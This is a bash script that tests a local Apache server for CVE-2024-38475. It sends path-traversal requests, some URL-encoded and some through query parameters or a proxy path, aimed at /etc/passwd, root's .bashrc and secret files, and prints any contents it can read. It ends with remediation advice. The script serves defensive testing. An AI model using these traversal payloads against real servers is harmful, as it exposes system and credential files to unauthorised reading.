#!/bin/bash
# Quick test script for CVE-2024-38475
# Tests the vulnerability after Apache is configured and running

SERVER_URL="http://localhost"
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo "======================================================================"
echo "CVE-2024-38475 Vulnerability Test Script"
echo "======================================================================"

# Function to test a vulnerable endpoint
test_endpoint() {
    local url="$1"
    local description="$2"
    
    echo -e "${YELLOW}Testing: $description${NC}"
    echo "URL: $url"
    
    response=$(curl -s -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
    
    if [ "$response" = "200" ]; then
        echo -e "${RED}VULNERABLE!${NC} Server returned 200 OK - file accessible"
        echo "Content:"
        curl -s "$url" 2>/dev/null | head -5
    elif [ "$response" = "403" ]; then
        echo -e "${GREEN}PROTECTED${NC} - Server returned 403 Forbidden (as expected)"
    elif [ "$response" = "404" ]; then
        echo -e "${GREEN}NOT FOUND${NC} - Server returned 404 (file doesn't exist or protected)"
    else
        echo "Server returned: $response"
    fi
    echo "----------------------------------------"
}

# Check if server is running
echo "Checking if Apache server is running..."
if ! curl -s "$SERVER_URL" > /dev/null 2>&1; then
    echo -e "${RED}ERROR: Apache server is not running or not accessible at $SERVER_URL${NC}"
    echo "Please ensure Apache is started with the vulnerable configuration."
    exit 1
fi

echo -e "${GREEN}Server is running. Starting vulnerability tests...${NC}"
echo

# Test cases for CVE-2024-38475
echo "Testing path traversal via /files/ endpoint..."
test_endpoint "$SERVER_URL/files/../../etc/passwd" "Directory traversal to /etc/passwd"
test_endpoint "$SERVER_URL/files/../../../root/.bashrc" "Access to root's bashrc"
test_endpoint "$SERVER_URL/files/../../secret/confidential.txt" "Access to secret directory"

echo
echo "Testing via /docs/ endpoint..."
test_endpoint "$SERVER_URL/docs/../secret/data.txt" "Path traversal via docs endpoint"
test_endpoint "$SERVER_URL/docs/..%2F..%2Fsecret/passwords.txt" "URL-encoded path traversal"

echo
echo "Testing query parameter path injection..."
test_endpoint "$SERVER_URL/redirect?path=../secret/confidential.txt" "Query parameter path injection"
test_endpoint "$SERVER_URL/redirect?path=../../etc/passwd" "Query parameter to system files"

echo
echo "Testing proxy endpoint with path manipulation..."
test_endpoint "$SERVER_URL/proxy/test/../../secret/data.txt" "Proxy endpoint path traversal"

echo
echo "======================================================================"
echo "Test completed!"
echo 
echo -e "${YELLOW}If any tests showed 'VULNERABLE!', your Apache configuration${NC}"
echo -e "${YELLOW}is susceptible to CVE-2024-38475.${NC}"
echo
echo -e "${GREEN}Recommended actions:${NC}"
echo "1. Upgrade Apache to version 2.4.60 or later"
echo "2. Review and fix rewrite rules"
echo "3. Implement proper access controls"
echo "======================================================================"